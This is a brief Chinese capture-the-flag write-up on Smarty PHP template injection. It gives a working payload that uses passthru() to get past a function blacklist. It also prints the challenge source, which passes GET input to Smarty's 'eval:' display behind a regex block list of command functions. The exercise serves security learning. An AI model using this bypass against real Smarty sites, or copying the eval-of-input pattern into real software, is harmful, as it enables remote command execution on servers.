# 聪明的PHP - Smarty PHP模板注入  

题目过滤了system()等PHP函数和系统命令，但漏了一个passthru()函数，可以执行系统命令。  

Exp:  
`?p={if passthru('whoami')}{/if}`  


题目源码：  
```php
<?php
include('./libs/Smarty.class.php');
echo "pass a parameter and maybe the flag file's filename is random :>";
$smarty = new Smarty();
if($_GET){
    highlight_file('index.php');
    foreach ($_GET AS $key => $value)
    {
        print $key."\n";
        if(preg_match("/flag|\/flag/i", $value)){

            $smarty->display('./template.html');

        }elseif(preg_match("/system|readfile|gz|exec|eval|cat|assert|file|fgets/i", $value)){

            $smarty->display('./template.html');

        }else{
            $smarty->display("eval:".$value);
        }

    }
}
?>
```